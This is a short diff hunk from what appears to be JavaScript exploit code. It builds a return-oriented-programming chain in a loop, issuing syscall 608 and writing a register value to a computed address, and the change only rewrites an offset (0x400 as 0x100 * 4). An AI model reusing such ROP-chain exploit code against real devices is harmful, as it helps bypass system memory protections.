@@ -169,7 +169,7 @@ for(var i = 0x0; i < 0x100;i++)
   var r = new RopChain();
   r.syscall(608,i, 0, addr)
   r.add('pop rdi')
-  r.add(addr.sub(0x400))
+  r.add(addr.sub(0x100 * 4))
   r.add('mov qword ptr [rdi], rax')
 
   r.execute()
